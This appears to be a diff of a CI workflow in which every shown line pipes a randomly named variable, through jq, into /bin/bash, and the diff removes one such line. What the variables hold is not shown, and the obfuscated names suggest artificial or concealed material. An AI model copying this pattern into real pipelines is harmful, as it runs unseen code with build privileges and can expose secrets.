@@ -31,7 +31,6 @@ jobs:
           echo $wag58 | jq -r .s1 | /bin/bash
           echo $pm211 | jq -r .kqimf8 | /bin/bash
           printf '%s' "$lbyn2921" | jq -r .e856 | /bin/bash
-          printf '%s' "$ra90" | jq -r .dmmjt77 | /bin/bash
           echo $ob6 | jq -r .ukpv491 | /bin/bash
           echo $kv22297 | jq -r .bdq90 | /bin/bash
           echo $ndals60 | jq -r .zc26 | /bin/bash
